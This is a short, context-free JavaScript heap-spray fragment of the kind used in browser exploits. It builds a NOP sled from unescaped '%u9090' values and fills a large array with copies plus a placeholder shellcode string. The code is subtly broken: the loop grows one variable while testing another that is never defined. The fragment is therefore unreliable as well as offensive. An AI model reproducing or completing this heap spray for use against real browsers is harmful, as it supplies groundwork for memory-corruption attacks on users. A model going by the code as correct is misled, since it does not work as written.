shellcode = unescape('%u4343%u4343%u4343…');
let nop = unescape('%u9090%u9090');
while (fullblock.length < 0x100000) {
  nop += nop;
}
sprayContainer = new Array();
for (i = 0; i < 1000; i++) {
  sprayContainer[i] = fullblock + shellcode;
}
